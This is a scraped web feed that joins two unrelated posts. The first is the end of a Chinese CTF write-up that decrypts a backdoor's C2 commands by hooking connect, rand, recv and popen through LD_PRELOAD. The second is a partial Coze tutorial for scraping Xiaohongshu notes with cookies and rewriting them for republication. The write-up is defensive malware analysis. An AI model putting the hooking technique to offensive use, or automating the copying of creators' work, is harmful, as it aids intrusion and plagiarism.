<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/09aab5bb06a74b63bdaf534ee7e5911d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6JqB5pmv572R5a6J5a6e6aqM5a6k:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768874375&amp;x-signature=hNbvhzb5UCZVZ449IIbvGZVBOD0%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-6">6.SnakeBackdoor-6</h2>
<pre><code class="hljs">请提交攻击者获取服务器中的flag。结果提交形式：flag{xxxx}
</code></pre>
<p>这里当时没有解出来，后面听别的师傅说是SM4加密，又是不懂的玩意，比赛完使用hook进行一个复现</p>
<p><strong>参考资料:<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.aristore.top%2Fposts%2FCISCN2025Quals%2F%23SnakeBackdoor-6" target="_blank" title="https://www.aristore.top/posts/CISCN2025Quals/#SnakeBackdoor-6" ref="nofollow noopener noreferrer">www.aristore.top/posts/CISCN…</a></strong></p>
<p>在上一题main 函数中，密文被解密后存入了 command 变量，随后立即执行了 <code>popen(command, "r")</code></p>
<p>popen 是一个标准库函数，如果我们能写一个自己的 popen，当木马调用它时，系统跑的是我们设计好的代码，那就可以在我的代码里把 command 参数打印出来，所以popen 就是我们的泄密点</p>
<p>想要让程序运行到 popen 这一步，前面必须满足一系列条件</p>
<p>首先，连接必须成功：程序里有 <code>if (connect(...) &lt; 0) exit(1)</code></p>
<p>那我们伪造 connect，让它永远返回 0</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/10478669305843948ccd2946bd9cbd09~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6JqB5pmv572R5a6J5a6e6aqM5a6k:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768874375&amp;x-signature=zlrYnIHvzFhJDtodiz3LugX9iMk%3D" alt="" loading="lazy"/></p>
<p>其次，密钥必须正确，程序用 rand() 生成密钥</p>
<p>那么我们就劫持 rand()，不管程序怎么算，都让它吐出上一题那个ac46fb610b313b4f32fc642d8834b456密钥</p>
<p>接着必须有数据输入，程序用 sub_18ED，底层调用 recv，从网络读指令</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8ff46bcfcab4427f9e7ca15301df1099~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6JqB5pmv572R5a6J5a6e6aqM5a6k:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768874375&amp;x-signature=5YcsIgU4QjROW5i7UBEDNRiBsIg%3D" alt="" loading="lazy"/></p>
<p>所以要劫持 recv，当程序要读数据时，把流量包里的十六进制密文塞给它</p>
<p>所以整个恶意软件的运行逻辑就是</p>
<pre><code class="hljs language-scss" lang="scss">连接C2服务器 (connect) → 生成加密密钥 (rand × <span class="hljs-number">4</span>) → 接收密文长度 (recv) → 接收密文数据 (recv) → 解密命令 (内部解密函数) → 执行命令 (popen) → 回传结果 (send)
</code></pre>
<p>首先由于后续操作中需要处理大量十六进制字符串，首先需要一个辅助函数将十六进制字符串转换为二进制字节流</p>
<p>这个函数是整个 Hook 代码的基础设施，其他所有函数都会依赖它来进行数据格式转换</p>
<pre><code class="hljs language-python" lang="python">// 十六进制转二进制void hex_to_bin(const char *<span class="hljs-built_in">hex</span>, unsigned char *<span class="hljs-built_in">bin</span>) {    size_t <span class="hljs-built_in">len</span> = strlen(<span class="hljs-built_in">hex</span>);    <span class="hljs-keyword">for</span> (size_t i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">len</span>; i += <span class="hljs-number">2</span>) {        sscanf(<span class="hljs-built_in">hex</span> + i, <span class="hljs-string">"%2hhx"</span>, &amp;<span class="hljs-built_in">bin</span>[i / <span class="hljs-number">2</span>]);    }}
</code></pre>
<p>这个函数的实现原理非常直接，遍历输入的十六进制字符串，每两个字符组成一个字节，使用 <code>sscanf</code> 的 <code>%2hhx</code> 格式说明符将其解析为一个字节值，并存储到目标缓冲区中</p>
<p>例如，十六进制字符串 "ac46fb61" 会被转换为字节序列 [0xac, 0x46, 0xfb, 0x61]</p>
<p>然后就是connect，让其return 0就可以了</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">connect</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> sockaddr *addr, <span class="hljs-type">socklen_t</span> len)</span> </span>{    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}
</code></pre>
<p>接着，程序使用 伪随机数生成器来动态生成加密密钥</p>
<p>具体来说，程序首先从 C2 服务器接收一个 4 字节的种子值，然后用这个种子初始化 <code>srand()</code>，接着连续调用 4 次 <code>rand()</code> 生成 4 个 32 位整数，这 16 字节的数据就是加密密钥，也就是上一题得到的flag<code>ac46fb610b313b4f32fc642d8834b456</code>，我们的目标是让程序在调用 <code>rand()</code> 时返回这个预定义密钥的各个部分</p>
<p>那么使用静态变量 <code>key_bin</code> 存储十六进制密钥的二进制形式，<code>rand_call_count</code> 跟踪 <code>rand()</code> 的调用次数，第一次调用时将十六进制密钥转换为二进制，后续每次调用时取出 4 字节数据作为 <code>unsigned int</code> 返回</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-type">const</span> <span class="hljs-type">char</span> *KEY_HEX = <span class="hljs-string">"ac46fb610b313b4f32fc642d8834b456"</span>;<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">rand</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> </span>{       <span class="hljs-type">static</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> key_bin[<span class="hljs-number">16</span>];    <span class="hljs-type">static</span> <span class="hljs-type">int</span> rand_call_count = <span class="hljs-number">0</span>;    <span class="hljs-type">static</span> <span class="hljs-type">int</span> inited = <span class="hljs-number">0</span>;    <span class="hljs-comment">// 转二进制    if (!inited) {        hex_to_bin(KEY_HEX, key_bin);        inited = 1;    }    // 每次调用取出 4 字节作为一个整数返回给 v8[i]    if (rand_call_count &lt; 4) {        unsigned int val = *(unsigned int *)&amp;key_bin[rand_call_count * 4];        rand_call_count++;        return val;    }    return 0;}</span>
</code></pre>
<p>然后程序通过 <code>recv()</code> 系统调用从 C2 服务器接收数据</p>
<p>这里接收过程分为两步，首先接收 4 字节的密文长度，然后接收对应长度的密文数据，这个过程会重复多次，每一对长度，数据代表一条加密命令</p>
<p>这些密文数据来自流量包中的实际通信记录，通过 Wireshark 追踪流 1827，可以获取完整的密文长度和密文序列，也就是上一题追踪到的那些，这些数据被组织成一个 <code>DATA</code> 数组，每两个元素为一组：第一个是密文长度的十六进制表示，第二个是对应的密文</p>
<p>可以使用 <code>recv_step</code> 静态变量记录 <code>recv()</code> 的调用次数，根据调用次数的奇偶性来决定返回长度还是数据</p>
<p>第一次调用返回任意 4 字节作为握手包；奇数次调用（1、3、5...）返回当前密文的长度，也就是需要转换为网络字节序；偶数次调用（2、4、6...）返回对应的密文数据</p>
<pre><code class="hljs language-perl" lang="perl">const char *DATA[] = {    <span class="hljs-string">"00000010"</span>, <span class="hljs-string">"49b351855f211b85bd012f80ce8ed5b3"</span>,    <span class="hljs-string">"00000010"</span>, <span class="hljs-string">"2cc5becb37ca595a89445461c6512efc"</span>,    <span class="hljs-string">"00000010"</span>, <span class="hljs-string">"b863696da0c6bb28da46e09069dd644f"</span>,    <span class="hljs-string">"00000030"</span>, <span class="hljs-string">"87e8faa921f3e67c530f1b6740a9d439..."</span>,    <span class="hljs-regexp">//</span> ... 更多密文数据 ...    NULL  // 结束标记};ssize_t <span class="hljs-keyword">recv</span>(<span class="hljs-keyword">int</span> sockfd, void *buf, size_t len, <span class="hljs-keyword">int</span> flags) {    static <span class="hljs-keyword">int</span> recv_step = <span class="hljs-number">0</span>;           <span class="hljs-regexp">//</span> 记录调用次数    static unsigned <span class="hljs-keyword">int</span> current_len = <span class="hljs-number">0</span>; <span class="hljs-regexp">//</span> 当前密文长度    // 握手包    <span class="hljs-keyword">if</span> (recv_step == <span class="hljs-number">0</span>) {        memset(buf, <span class="hljs-number">0x41</span>, <span class="hljs-number">4</span>);          recv_step++;        <span class="hljs-keyword">return</span> <span class="hljs-number">4</span>;    }    <span class="hljs-keyword">int</span> idx = recv_step - <span class="hljs-number">1</span>;    <span class="hljs-keyword">if</span> (DATA[idx] == NULL) {        <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);    }    // 长度（奇数次调用）    <span class="hljs-keyword">if</span> (recv_step % <span class="hljs-number">2</span> != <span class="hljs-number">0</span>) {        sscanf(DATA[idx], <span class="hljs-string">"%x"</span>, &amp;current_len);        <span class="hljs-regexp">//</span> 创建<span class="hljs-number">4</span>字节缓冲区存储长度值        unsigned char len_buf[<span class="hljs-number">4</span>];        <span class="hljs-regexp">//</span> 构造网络字节序（大端序）        len_buf[<span class="hljs-number">0</span>] = (current_len &gt;&gt; <span class="hljs-number">24</span>) &amp; <span class="hljs-number">0xFF</span>;  <span class="hljs-regexp">//</span> MSB        len_buf[<span class="hljs-number">1</span>] = (current_len &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>;        len_buf[<span class="hljs-number">2</span>] = (current_len &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>;        len_buf[<span class="hljs-number">3</span>] = current_len &amp; <span class="hljs-number">0xFF</span>;          <span class="hljs-regexp">//</span> LSB        memcpy(buf, len_buf, <span class="hljs-number">4</span>);        recv_step++;        <span class="hljs-keyword">return</span> <span class="hljs-number">4</span>;    }    // 密文（偶数次调用）    <span class="hljs-keyword">if</span> (recv_step % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>) {        unsigned char *cipher_bin = (unsigned char *)malloc(current_len);        hex_to_bin(DATA[idx], cipher_bin);        <span class="hljs-regexp">//</span> 将二进制密文数据复制到缓冲区        memcpy(buf, cipher_bin, current_len);        <span class="hljs-regexp">//</span> 释放临时分配的内存        free(cipher_bin);        recv_step++;        <span class="hljs-keyword">return</span> current_len;    }    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}
</code></pre>
<p>程序解密命令后，会使用 <code>popen()</code> 函数执行解密后的 shell 命令</p>
<p>这是整个攻击链的终点，现在要执行了，我们的目标是在命令执行前将其打印出来，这样就能获取明文内容。</p>
<p>通过 Hook <code>popen()</code> 函数，在它被调用时打印传入的 <code>command</code> 参数，然后返回一个合法的文件指针（指向 <code>/dev/null</code>），让程序以为命令执行成功了</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-function">FILE *<span class="hljs-title">popen</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *command, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *type)</span> </span>{    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%s\n"</span>, command);    <span class="hljs-keyword">return</span> <span class="hljs-built_in">fopen</span>(<span class="hljs-string">"/dev/null"</span>, <span class="hljs-string">"r"</span>);}
</code></pre>
<p>为了让程序稳定运行而不崩溃，还需要处理两个额外的函数</p>
<p>因为在 <code>popen()</code> 中返回的是 <code>/dev/null</code> 的普通文件流，而不是真正的进程管道</p>
<p>当程序后续调用 <code>pclose()</code> 尝试关闭这个假管道时，或者调用 <code>send()</code> 通过无效的 Socket 回传结果时，程序会报错退出</p>
<p><strong>Hook pclose()</strong>：当程序尝试关闭不存在的管道时，直接返回成功即可</p>
<p><strong>Hook send()</strong>：当程序尝试通过 Socket 发送数据时，直接返回发送长度，表示发送成功，但不真正执行任何网络操作</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">pclose</span><span class="hljs-params">(FILE *stream)</span> </span>{    <span class="hljs-keyword">if</span> (stream) <span class="hljs-built_in">fclose</span>(stream);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}<span class="hljs-function"><span class="hljs-type">ssize_t</span> <span class="hljs-title">send</span><span class="hljs-params">(<span class="hljs-type">int</span> sockfd, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *buf, <span class="hljs-type">size_t</span> len, <span class="hljs-type">int</span> flags)</span> </span>{    <span class="hljs-keyword">return</span> len;}
</code></pre>
<p>所以最终的hook.c代码就是把上述的都拼在一起即可</p>
<p>然后linux环境下执行终端命令</p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">编译为共享库gcc -fPIC -shared -o hook.so hook.c -ldl<span class="hljs-comment"># 使用 Hook 库运行木马程序LD_PRELOAD=./hook.so ./shell</span></span>
</code></pre>
<p><code>LD_PRELOAD</code> 环境变量告诉动态链接器在加载其他共享库之前先加载指定的库，这样我们 Hook 的函数就会优先于系统的同名函数被调用</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/01d9e6838da24a32bfa54628b452220b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6JqB5pmv572R5a6J5a6e6aqM5a6k:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768874375&amp;x-signature=hLIJf25YYk5%2FjcBfF1bMDIvWI1s%3D" alt="" loading="lazy"/></p>
<p>学习了学习了，hook的好处就是不需要理解程序内部的加密算法实现，只需要知道加密密钥并控制程序的输入输出流程</p>
<h2 data-id="heading-7">7.总结</h2>
<p><strong>筛选定位</strong>：Wireshark过滤 <code>http contains "keyword"</code>，追踪TCP流重组完整会话，异常特征：数据量过大、危险函数调用、多层编码</p>
<p><strong>编码解码</strong>：Base64（字符集+4倍数长度）、Hex（0-9A-F）、URL编码，逐层解码到明文</p>
<p><strong>加密分析</strong>：找到密钥硬编码位置或协议协商逻辑，实现加解密算法，注意跨平台rand()实现差异</p>
<p><strong>恶意提取</strong>：识别PK头（ZIP）、明文脚本，提取还原攻击代码</p>
<p><strong>高级Hook</strong>：当加密复杂时，用LD_PRELOAD劫持<code>connect</code>/<code>rand</code>/<code>recv</code>/<code>popen</code>，注入流量数据获取解密命令</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[扣子（Coze）实战：小红书图文二创，可直接到小绿书草稿箱，亦可发小红书]]></title>    <link>https://juejin.cn/post/7594351060614774803</link>    <guid>https://juejin.cn/post/7594351060614774803</guid>    <pubDate>2026-01-13T03:57:02.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594351060614774803" data-draft-id="7594389431835623465" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="扣子（Coze）实战：小红书图文二创，可直接到小绿书草稿箱，亦可发小红书"/> <meta itemprop="keywords" content="Coze"/> <meta itemprop="datePublished" content="2026-01-13T03:57:02.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="吾鳴"/> <meta itemprop="url" content="https://juejin.cn/user/3683842894347076"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            扣子（Coze）实战：小红书图文二创，可直接到小绿书草稿箱，亦可发小红书
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3683842894347076/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    吾鳴
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T03:57:02.000Z" title="Tue Jan 13 2026 03:57:02 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>大家好，我是吾鳴。专注于分享提升工作与生活效率的工具，无偿分享AI领域相关的精选报告，持续关注AI的前沿动向。</p>
<p>最近有些朋友问，有没有小红书二创的工作流？目的是看到小红书上面不错的一些笔记，希望可以对这些笔记进行二创，然后发布到小绿书上，想通过工作流把流程给自动化。</p>
<p>之前吾鳴有分享过一篇关于小红书二创的，比较简单，没有对接小绿书，而且配图没有进行二创，本文分享的工作流除了实现小红书的笔记文案二创外，还将进行配图的二次创作，并且支持直接发送小绿书，同时也可以发小红书。</p>
<p>在开始本工作流的讲解之前我们来看看效果，我在小红书上选择了一篇笔记，把笔记的链接丢给工作流，选择输入二创6张配图，大约花个2、3分钟，一篇小红书图文二创的笔记就生成好了。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ed87ee4d202e433cae62aecfa70ef0aa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768881421&amp;x-signature=E1td0cxdZ2vLxMJC5jB9m3TbnQw%3D" alt="" loading="lazy"/></p>
<p>要发小红书的话，需要从工作流上把二创后的笔记标题、配图、文案下载下来，然后到小红书平台发布。</p>
<h2 data-id="heading-0">1. 完整的工作流程</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/87c8773d9dba4bb58f472863f5045e5b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768881421&amp;x-signature=Lwoxiz48QchMLMpFpapxWLxsIjE%3D" alt="" loading="lazy"/></p>
<p>1、小红书笔记内容提取：通过插件，根据输入的小红书笔记链接获取小红书笔记的标题、内容、配图等信息。</p>
<p>2、小红书内容仿写：从提取到的小红书笔记内容中，提炼笔记的核心观点，并且对依据核心观点进行仿写。</p>
<p>3、小红书配图二创：从提取到的小红书笔记图片列表中，分析配图的风格核心元素等信息，然后进行图片二创。</p>
<p>4、小绿书草稿生成：把二创后的图片、标题、笔记内容一起发送给小绿书，生成小绿书文章草稿。</p>
<h2 data-id="heading-1">2. 工作流详细节点解读</h2>
<h3 data-id="heading-2">2.1. 开始</h3>
<ul>
<li>note_url：小红书笔记链接，必填</li>
<li>cookies：小红书cookies，必填</li>
<li>app_id：公众号开发者ID，必填</li>
<li>app_secret：公众号开发者密钥，必填</li>
<li>api_token：插件认证，可后台回复【芝麻开门】联系获取（有条件），必填</li>
<li>nums：配图数量，非必填，默认6张</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/734c776deb234ab9a50d814a778633bc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768881421&amp;x-signature=qJZx96H43UUb6CPu6LeHGL1q26I%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-3">2.2. 获取小红书笔记内容</h3>
<p>这个节点用来获取小红书的笔记内容，使用到了扣子三方插件【小红书工具箱】的【get_xhs_note_detail_cookies】工具。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c645439a6c4d4ca4a4ac8f619974d468~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768881421&amp;x-signature=5OT92e93%2BwH3NtVubxXKWVxA2ck%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-4">2.3. 小红书笔记核心观点提炼</h3>
<p>这个节点使用到了扣子官方的大模型节点，用于提取小红书笔记的核心观点。因本工作流提示词较多，文章篇幅原因，系统提示词我统一放到了文末。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c5fc13cb508941668d71440a3d59e5a3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768881421&amp;x-signature=q6YRecLFnN9D4aXFkcNwuCopCuc%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-5">2.4. 小绿书文章仿写</h3>
<p>这个节点使用到了扣子官方的大模型节点，用于对小红书的笔记内容进行二创，它的参数如下：</p>
<ul>
<li>模型：选择【DeepSeek-V3.1】</li>
<li>输入：</li>
</ul>

<ul>
<li>
<ul>
<li>style：小红书笔记核心观点提炼 -&gt; note_style</li>
<li>abstract：小红书笔记核心观点提炼 -&gt; note_abstract</li>
<li>core_point：小红书笔记核心观点提炼 -&gt; note_core_point</li>
</ul>
</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1c8d828deeb74b5bba77cdde49b7c2da~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768881421&amp;x-signature=kBrjyIVUpspDdE5LuZf8qqjvch0%3D" alt="" loading="lazy"/></p>
<p>PS：本工作流提示词较多，文章篇幅原因，系统提示词我统一放于文末。</p>
<h3 data-id="heading-6">2.5. 小绿书文章标题生成</h3>
<p>这个节点用来根据二创后的笔记内容来生成爆款的文章标题，使用到了扣子官方的大模型节点。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f3c291f3e9744a4aa23d0c63da2e076b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768881421&amp;x-signature=dYP0PC5FgK4a%2Bqt5hbPGiLK37Zw%3D" alt="" loading="lazy"/></p>
<p>PS：本工作流提示词较多，文章篇幅原因，系统提示词我统一放于文末。</p>
<h3 data-id="heading-7">2.6. 配图风格元素提取</h3>
<p>这个节点用来对小红书笔记配图的风格、主体元素进行分析，便于进行图片二创，使用到了扣子官方的批处理节点。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8923788703d241e3bcec89eaa6b6a77c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768881421&amp;x-signature=rw611uAquZTA6ES3xt66185eOv4%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-8">2.7. 配图图片提示词生成</h3>
<p>这个节点用来读取小红书笔记配图图片，并且通过视觉理解模型分析配图的风格和核心主体元素，便于进行配图二创。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a34976bc750446d1bb8829d46f1d39a2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768881421&amp;x-signature=KZKO%2BabDBNH6ZgLJXTtOx7s1Ndk%3D" alt="" loading="lazy"/></p>
<p>PS：本工作流提示词较多，文章篇幅原因，系统提示词我统一放于文末。</p>
<h3 data-id="heading-9">2.8. 配图风格元素汇总</h3>
<p>这个节点是把前面节点分析得到的小红书配图的风格和主体元素做汇总，便于对配图进行二创。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ada6c1557e8641de8cda0f6e04c3efc9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768881421&amp;x-signature=Gsd7lKdde0F9Bd9d08zIXMN%2Fev8%3D" alt="" loading="lazy"/></p>
